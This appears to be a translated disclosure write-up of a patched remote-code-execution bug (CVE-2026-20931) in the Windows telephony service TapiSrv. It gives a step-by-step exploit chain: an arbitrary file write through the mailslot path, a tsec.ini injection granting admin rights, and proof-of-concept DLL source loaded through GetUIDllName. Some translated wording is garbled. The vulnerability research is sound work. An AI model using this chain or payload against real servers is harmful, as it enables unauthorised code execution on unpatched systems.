#  【来自电话服务的RCE】解决电话服务中的漏洞  
true9
                    true9  好靶场   2026-02-14 00:06  
  
💡 好靶场  
  
我们是一个专门为所有网络安全人员制作网络安全靶场的团队，我们立志于制作出让所有安全同好都能学到东西的好靶场，所以我们团队名称就叫“  
好靶场”。关注我们获取更多免费会员的福利。  
我们承诺每天至少更新1-2个新靶场。2026年冲刺1000个。  
  
  
  
# 好靶场目前进度  
  
641  
  
靶场数量  
  
199个  
  
漏洞报告数量  
  
好靶场用户使用手册：[【好靶场】用户使用指南](https://mp.weixin.qq.com/s?__biz=Mzg4MDg5NzAxMQ==&mid=2247486175&idx=1&sn=d4fd496c04eff81802f2c1be30f77b78&scene=21#wechat_redirect)  
  
  
  
大家感兴趣的可以关注一下大佬写的文章，使劲儿催稿。好靶场的股东之一。  
  
  
本文仅供参考，并非指示或号召实施非法行为。我们的目标是突出现有的漏洞，提醒用户安全，并指导如何保护您的个人信息。作者对信息的使用不负责任。别忘了数据安全。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKibjXQDuYZva6DwicokfbGMOp714pedN4ibGq4v6ciaOMSrLE5EQFhDIW4OXFMlx56WicsJvWLQm3ibTa86wO1gUNQ0dJQ2ujcibic8e4eHWFOq5VM/640?wx_fmt=png&from=appmsg "")  
### 简要介绍Windows中的电话通信  
  
Windows 通过电话应用程序接口（TAPI）提供电话功能，TAPI 是一个单一接口，允许用户应用程序与多种电话设备通信。这可以包括物理设备（固定电话和调制解调器）以及虚拟或软件解决方案：VoIP系统、软电话、SIP网关。一般来说，所有传统意义上“响起”的事物。  
  
TAPI 主要有两个版本：TAPI 2.x，这是一个用 C 语言实现的过程式 API，以及使用 COM 实现的 TAPI 3.x。两种方案都依赖于相同的架构：应用程序通过 TAPI 与作系统通信，作系统通过 TSP（电话服务提供商）管理底层电话基础设施，TSP 是由电话供应商提供的库，实现了与特定设备交互的逻辑。  
  
在云电话时代，这些似乎都已成过去，但在Windows开箱即用中依然稳定支持。  
### TapiSrv 服务  
  
根据 TAPI 版本的不同，应用程序要么使用 ，要么使用 ，要么使用 。同时，这两个库更像客户端包装器，整个电话实现被迁移到独立服务中，通过 RPC 与之通信。该服务被调用，负责管理设备、会话、呼叫以及呼叫 TSP。它代表账户运行，默认不会启动，但当调用任何 TAPI 函数时会自动启动。该服务的实现位于 。  
```
tapi32.dll
tapi3.dll
TapiSrv
NETWORK SERVICE
tapi32.dll/tapi3.dll
tapisrv.dll
```  
### TAPSRV RPC 接口  
  
客户端通过 RPC 接口与服务交互。它是MS-TRP协议的一部分，该协议有非常详细的规范。默认情况下，这种体验仅限本地客户端使用。tapsrv  
  
不过，在 Windows 服务器版本中，你也可以允许远程客户端访问。注册表中的密钥负责此事 - 。  
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Telephony\Server\DisableSharing
```  
  
你也可以通过 snap-in 中的相应部分启用远程访问。  
```
TapiMgmt.msc
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKibjXQDuYZv9hXjjz4fp9Cqro93XQWibZkO6AnKrxfQFeOau1I7GVs7yLpUMGd0jQywkVWpxRCYjqFh8EtD1lOLTGvsFFuEZKYEticviakianto/640?wx_fmt=png&from=appmsg "")  
  
当然，调制解调器和电话的远程管理几乎没用——首先，这个设置是为集中访问服务器解决方案（如PBX）而设。它允许支持通过TAPI工作的应用程序与电话服务提供商透明通信，而无需在每个客户端电脑上安装必要的TSP——你只需指定一个中央服务器（例如通过组策略）。  
  
在这种模式下（我们称之为服务器端），RPC接口通过SMB管道对远程客户端开放（也就是说，连接至少需要一个非特权域账户）。此外，在这种情况下，服务会在LDAP中发布自身信息，因此在域内很容易找到。tapsrv  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKibjXQDuYZtYPwZ3CDyy5r9MqhyIcByE97ibibnWWG6XS10oGaSZe2OKz8HiaibmTgvXd6I5pQTWZicn4StiaKrHp3mqzfLernaKMvWFS4561LdW8/640?wx_fmt=png&from=appmsg "")  
  
                                 LDAP中的服务信息  
#### MS-TRP的幕后内容  
  
RPC接口只有三种方法：、、和。前两个负责创建和终止会话，所有电话相关工作均通过 完成。ClientAttachClientDetachClientRequestClientRequest  
  
该方法只使用一个参数——一个字节数组（规范中称之为包）。数据包的前四个字节包含一个字段——数组中处理函数的索引，其余是任意数据，其格式取决于被调用的函数。Req_Func  
  
规范中描述了支持的函数列表及其对应的值和输入参数结构（虽然不完整），很容易看出它几乎与TAPI 2的函数相同。事实证明，它是一种在RPC之上构建的RPC，这在Windows服务中并不罕见——例如，服务的RASRPC接口（我最近也发现了LPE）绝对实现了。Req_FuncRasMan  
#### 会话初始化  
  
在TAPI架构中，客户端是发起RPC连接的计算机，线路应用程序是利用API在该连接上运行电话线路的程序。要建立会话，客户端需要调用具有以下签名的RPC方法：ClientAttach  
```
long ClientAttach(
     [out]   PCONTEXT_HANDLE_TYPE *pphContext,
     [in]    long    lProcessID,
     [out]   long   *phAsyncEventsEvent,
     [in, string]    wchar_t *pszDomainUser,
     [in, string]    wchar_t *pszMachine
   );
```  
  
同时，服务检查客户端账户的权限，并为会话分配若干位标志，这些标志后来被用于 API 方法中限制访问。  
```
CheckTokenMembership(hClientToken, pBuiltinAdministratorsSid, &bIsLocalAdmin);if (bIsLocalAdmin||IsSidLocalSystem(hClientToken)) {ptClient->dwFlags|=8;}if (bIsLocalAdmin||IsSidNetworkService(hClientToken) ||IsSidLocalService(hClientToken) ||IsSidLocalSystem(hClientToken)) {ptClient->dwFlags|=1;}if (TapiGlobals.dwFlags&TAPIGLOBALS_SERVER) {if ((ptClient->dwFlags&8) ==0 ) {wcscpy ((WCHAR*) InfoBuffer, szDomainName);wcscat ((WCHAR*) InfoBuffer, L"\\");wcscat ((WCHAR*) InfoBuffer, szAccountName);if (GetPrivateProfileIntW("TapiAdministrators",                           (LPCWSTR) InfoBuffer, 0, "..\\TAPI\\tsec.ini"                        ) ==1) {ptClient->dwFlags|=9;        }    }}
```  
  
如你所见，该值对应于管理权限（本地管理员或系统），并分配给服务账户。此外，在服务器模式下，文件部分明确指定的用户会获得管理员权限81[TapiAdministrators] C:\Windows\TAPI\tsec.ini.  
  
在你建立一个会话以便继续使用与电话线相关的方法后，你必须通过发送初始化包来初始化应用对象。  
#### 异步事件处理  
  
显然，电话通信涉及处理服务器到客户端的事件，例如接收来电通知。由于RPC采用同步请求-响应模型，且不适合此类任务，MS-TRP提供了自己的异步事件传递机制。  
  
该方法在通话时选择，主要取决于客户端是本地还是远程。ClientAttach  
  
对于本地客户端来说，一切都很简单——客户端在参数中指定进程的标识符，服务创建事件对象，并将句柄复制给客户端进程。如果有通知，服务通过事件对象进行信号，客户端必须通过发送数据包来获取该数据。lProcessIDCreateEventGetAsyncEvents (Req_Func = 0)  
  
如果服务能在服务器模式下运行，那么一切都会更有趣。在这种情况下，向远程客户端传递事件有两种方法：推送和拉取。方法的选择基于传递给 的参数。ClientAttach  
  
在推送模型中，客户端在参数中指定RPC端点的地址，采用文档中描述的特殊格式（例如，）。服务连接到指定的端点，期望在那里看到远程 RPC 接口，并在事件发生时调用 RPC 方法。pszMachineCLIENT-PC-NAME"ncacn_ip_tcp"31337"RemoteSPEventProc  
  
在拉取模型中，客户端在参数中指定邮件槽名称——遇到新事件时，服务会发送短消息（仅4字节），这些消息不包含事件数据本身，但表示事件数据可用。收到消息后，客户有义务拨打电话并接听这些事件。pszDomainUserGetAsyncEvents  
  
为了让客户端能够确定事件针对哪个应用程序，服务在传输数据中包含一个4字节的标识符——即客户端在对应应用包中指定的字段值。InitContextInitialize  
### 通过邮箱前往  
  
Mailslot 是 Windows 中的一种遗留进程间通信机制，设计用于传输小型单向消息。服务器进程监听指定的端点，而客户端（本地或远程）可以向该端发送数据——但无法保证数据的传递和反馈。在网络传输时，消息通过 NetBIOS over UDP 传输（更准确地说，是传输——自 Windows 11 24H2 起邮件槽远程功能已被禁用）。为了在客户端处理邮件槽，使用标准的文件作API， ， ，要打开邮箱槽，你需要以该格式传递到路径（虽然技术上远程邮箱槽不能被“打开”或理解其存在，传输仅为单向）。最终的句柄表现得像普通的只写文件。CreateFileWriteFileCloseHandleCreateFile\\<COMPUTERNAME>\MAILSLOT\<MailslotName>  
  
在拉动型号中负责打开信箱的代码如下：ClientAttach  
```
if (wcslen (pszDomainUser) >0)        {if ((ptClient->hMailslot=CreateFileW(pszDomainUser,GENERIC_WRITE,FILE_SHARE_READ,                        (LPSECURITY_ATTRIBUTES) NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,                        (HANDLE) NULL                    )) !=INVALID_HANDLE_VALUE)            {gotoClientAttach_AddClientToList;            }            ...        }
```  
  
这里是客户端传递的一个参数。是的，它直接传递给函数，没有检查前缀之类的——这是一个简单的漏洞。pszDomainUserCreateFileW\\*\MAILSLOT\  
  
因此，客户端可以指定任意路径到文件，只要文件存在且可写入账户，服务将成功打开该文件并写入事件通知，而非发送到协议意图的邮箱。NETWORK SERVICE  
### 录制任意内容  
  
为了完整记录任意文件，我们必须控制录制的内容  
和地点。我们  
已经决定了地点，但内容呢？  
  
不难推测，在拉取模型中，发送到邮箱槽的4字节值作为通知是客户端初始化应用时指定的字段。因此，录制的内容也可以被控制——为此，只需学习如何为特定应用发起事件。InitContext  
  
服务中有不少函数会触发客户端事件，但大多数都深藏在调用处理逻辑中。与其去弄清楚远程客户端如何联系他们，不如用 。这个函数会为单个全局“最高优先级应用”触发事件，远程调用非常简单——只需发送一个未文档包，作为 tapiRequestMakeCall TAPI 函数的后端。NotifyHighestPriorityRequestRecipientTRequestMakeCall (Req_Func = 121)  
  
在实现 lineRegisterRequestRecipient TAPI 函数的未公开数据包处理程序中，优先级最高的应用被覆盖：LRegisterRequestRecipient (Req_Func = 61)  
```
if (dwRequestMode&LINEREQUESTMODE_MAKECALL)            {if (!ptLineApp->pRequestRecipient)                {// Добавляем приложение в списокPTREQUESTRECIPIENTpRequestRecipient;pRequestRecipient->ptLineApp=ptLineApp;pRequestRecipient->dwRegistrationInstance=pParams->dwRegistrationInstance;EnterCriticalSection (&gPriorityListCritSec);if ((pRequestRecipient->pNext=TapiGlobals.pRequestRecipients))                    {pRequestRecipient->pNext->pPrev=pRequestRecipient;                    }TapiGlobals.pRequestRecipients=pRequestRecipient;LeaveCriticalSection (&gPriorityListCritSec);ptLineApp->pRequestRecipient=pRequestRecipient;// Находим новое приложение с наивысшим приоритетомTapiGlobals.pHighestPriorityRequestRecipient=GetHighestPriorityRequestRecipient();if (TapiGlobals.pRequestMakeCallList)                    {NotifyHighestPriorityRequestRecipient();                    }                }                ...            }
```  
  
应用的优先级根据列表中字段的索引确定：pszModuleName  
```
PTREQUESTRECIPIENTGetHighestPriorityRequestRecipient(){BOOLbFoundRecipientInPriorityList=FALSE;WCHAR*pszAppInPriorityList,*pszAppInPriorityListPrev= (WCHAR*) LongToPtr(0xffffffff);PTREQUESTRECIPIENTpRequestRecipient,pHighestPriorityRequestRecipient=NULL;WCHAR*pszPriorityList=NULL;EnterCriticalSection (&gPriorityListCritSec);pRequestRecipient=TapiGlobals.pRequestRecipients;if (RpcImpersonateClient(0) ==0)    {// Получаем список приоритета приложений для текущего пользователяGetPriorityListTReqCall(&pszPriorityList);    }while (pRequestRecipient)    {// Вычисляем индекс текщуего имени приложения в спискеif (pszPriorityList&&            (pszAppInPriorityList=wcsstr(pszPriorityList,pRequestRecipient->ptLineApp->pszModuleName                )))        {if (pszAppInPriorityList<=pszAppInPriorityListPrev)            {pHighestPriorityRequestRecipient=pRequestRecipient;pszAppInPriorityListPrev=pszAppInPriorityList;bFoundRecipientInPriorityList=TRUE;            }        }elseif (!bFoundRecipientInPriorityList)        {pHighestPriorityRequestRecipient=pRequestRecipient;        }pRequestRecipient=pRequestRecipient->pNext;    }LeaveCriticalSection (&gPriorityListCritSec);returnpHighestPriorityRequestRecipient;}
```  
  
列表随后从当前客户账户的注册表加载：  
```
RPC_STATUSGetPriorityListTReqCall(WCHAR**ppszPriorityList){HKEYhKey=NULL;HKEYphkResult=NULL;EnterCriticalSection(&gPriorityListCritSec);if ( !RegOpenCurrentUser(0xF003F, &phkResult) )    {if ( !RegOpenKeyExW(phkResult,L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities",0,0x20019,&hKey) )            {GetPriorityList(hKey, L"RequestMakeCall", ppszPriorityList);RegCloseKey(hKey);            }RegCloseKey(phkResult);    }LeaveCriticalSection(&gPriorityListCritSec);returnRpcRevertToSelf();}
```  
  
你可以在路上找到它。默认情况下，总会有一个单一值——（即使没有，也可以作为未文档包添加。  
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Telephony\HandoffPriorities\RequestMakeCall
DIALER.EXE 
LSetAppPriority (Req_Func = 69))
```  
  
最后，客户端在应用对象初始化时，会在包中传递列表中搜索的字段。pszModuleNameInitialize  
  
现在所有拼图都已就绪，我们可以构建一个算法，允许我们远程覆盖任意已有的文件，并包含任意内容。  
  
首先，你需要通过SMB管道连接到接口，并在参数中指定方法，指定到所需文件的路径。接下来，将所需内容拆分为4字节块，对每个块做以下作：tapsrvClientAttachpszDomainUser  
1. 发送一份我们会指定：Initialize (Req_Func = 47)  
  
- InitContext– 需要4字节  
  
- pszModuleName–DIALER.EXE  
  
1. 给应用最高优先级，且 。  
```
LRegisterRequestRecipient (Req_Func = 61, dwRequestMode = LINEREQUESTMODE_MAKECALL, bEnable = 1)
```  
  
1.   
1.   
1.   
1.   
1.   
1. 通过发送数据包来触发事件。TRequestMakeCall (Req_Func = 121)  
  
1. 从队列中用一个数据包取事件——此时已有4个字节的事件成功写入文件。GetAsyncEvents (Req_Func = 0)InitContext  
  
1. 将同一个包的应用从列表中移除。LRegisterRequestRecipient (bEnable = 0)  
  
1. 使用.来解除初始化应用。  
```
Shutdown (Req_Func = 86)
```  
  
1.   
1.   
1.   
1.   
1.   
### 从文件录制到RCE  
  
目前，我们已经学会了如何覆盖你拥有写权限的任意现有文件。你不必走远就能回答“重写会是什么感觉？”这个问题——该服务本身有一个非常方便的配置文件。在服务器模式下，它保证存在且可写，而且正如我们之前发现的，非常方便地包含服务管理员列表。通过写入类似的内容并重新连接新的ClientAttach调用，我们将获得带有管理员标志的会话。NETWORK   
```
SERVICE
C:\Windows\TAPI\tsec.ini
NETWORK SERVICE
«[TapiAdministrators]\r\nDOMAIN\\attacker=1»
```  
  
拥有服务管理员权限后，攻击面显著增加。在研究规范时，GetUIDllName  
包立刻引起了注意，根据描述，它用于安装/移除TSP：  
  
The GetUIDllName packet, along with the TUISPIDLLCallback packet and the FreeDialogInstance packet, is used to install, configure, or remove a TSP on the server.  
  
函数代码显示，拥有管理员权限的客户端确实可以通过在包中指定其绝对路径来添加新的提供者 DLL：  
```
switch (pParams->dwObjectType)    {caseTUISPIDLL_OBJECT_LINEID:            ...caseTUISPIDLL_OBJECT_PHONEID:            ...caseTUISPIDLL_OBJECT_PROVIDERID:// Если у клиента нет прав администратора и он хочет// удалить провайдер либо добавить новый, указав путь к DLL в запросе - // возвращаем ошибку.if ((ptClient->dwFlags&8) ==0&& (pParams->bRemoveProvider||pParams->dwProviderFilenameOffset!=TAPI_NO_DATA)) {pParams->lResult=LINEERR_OPERATIONFAILED;return;            }if (pParams->dwProviderFilenameOffset!=TAPI_NO_DATA) {TCHAR*pszProviderFilename=pDataBuf+pParams->dwProviderFilenameOffset;// Загружаем DLL по пути, который был передан в запросеif (ptDlgInst->hTsp=LoadLibrary(pszProviderFilename)) {if (pfnTSPI_providerUIIdentify= (TSPIPROC) GetProcAddress(ptDlgInst->hTsp,"TSPI_providerUIIdentify")) {// И вызываем из неё функциюpParams->lResult=pfnTSPI_providerUIIdentify(pszProviderFilename);                    } else {                        ...                    }                } else {                    ...                }            } else {                ....            }    }
```  
  
服务会加载DLL并调用导出函数，这为我们提供了简单且可靠的代码执行方式。此外，如果我们从该函数返回非零值，FreeLibrary调用会卸载DLL，这也使得利用后可以移除加载。TSPI_providerUIIdentify  
  
最明显的方法是将 DLL 加载到一个 SMB 球体上，并在请求中指定 UNC 路径。实际上，在同一Active Directory森林的Windows机器上使用共享时，这功能正常，但在攻击者主机上使用impacket-smbserver或Samba时会带来困难——在这种情况下，它会返回一个。或者，你也可以使用已有的文件写原语，直接将 DLL 传递到磁盘。任何可写入和重写的现有文件都不会破坏系统中的任何内容，例如：  
```
LoadLibrary
ERROR_SMB_GUEST_LOGON_BLOCKED
NETWORK SERVICE
```  
```
C：\Windows\System32\catroot2\dberr.txt
C：\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp\MpCmdRun.log
C：\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp\MpSigStub.log
```  
  
即使连接速度良好，用4字节作写入一个10千字节的文件大约需要2-3分钟，但这样可以避免使用第三方球。  
  
演示时，一个简单的 DLL 具有通过 cmd.exe  
 执行命令的功能是合适的。  
```
#include <Windows.h>extern"C"__declspec(dllexport) LONG__stdcallTSPI_providerUIIdentify(LPWSTRlpszUIDLLName){wchar_tcmd[] =L"cmd.exe /c whoami /all > C:\\Windows\\Temp\\poc.txt";STARTUPINFOsi;PROCESS_INFORMATIONpi;ZeroMemory(&si, sizeof(si));si.cb=sizeof(si); ZeroMemory(&pi, sizeof(pi));if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW|NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))    {CloseHandle(pi.hProcess);CloseHandle(pi.hThread);    }return0x1337;}
```  
  
如果函数的返回值非零，该值将以错误代码的形式返回给客户端，也就是说，你可以清楚地看到该函数已被调用。  
```
TSPI_providerUIIdentify
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKibjXQDuYZtx8BCVHeEkWeP3YVISicVA50odeKKo0TAwyib7gxWLsth8ObXQr8O795e0MqTP92hSd0BhrdnaRhD9Ql0Lp6Ae20CqNcIoQoWLQ/640?wx_fmt=png&from=appmsg "")  
  
                                         漏洞利用流程  
  
特权升级到系统内部的过程将被保密——每个渗透测试者都知道SeImmanatePrivilege的滥用情况。NETWORK SERVICE  
### 披露时间线  
  
**2025年6月11日**  
 – 向Microsoft发送的漏洞报告  
  
**2025年12月22**  
日 – Microsoft确认存在漏洞  
  
**2025年12月23**  
日 – Microsoft 作为漏洞赏金的一部分支付了奖励 - 5000美元  
  
**2025年12月29**  
日——漏洞被分配为CVE-2026-20931  
  
**2026年1月13**  
日 – 补丁星期二  
  
**2026年1月19日**  
 – 漏洞分析发布  
### 结论  
  
在我看来，这是一个很好的例子，说明一个相当琐碎的漏洞如何演变成一个完整的RCE。同时也提醒我们，在Windows的遗留组件深处，可能还有更多惊喜。  
  
最后，我想提醒大家，以上所有这些**功能只有在服务运行在服务器模式下**  
才可被利用，而现代基础设施几乎找不到服务器模式。不过，这并不是不更新的理由。注意安全！  
  
  
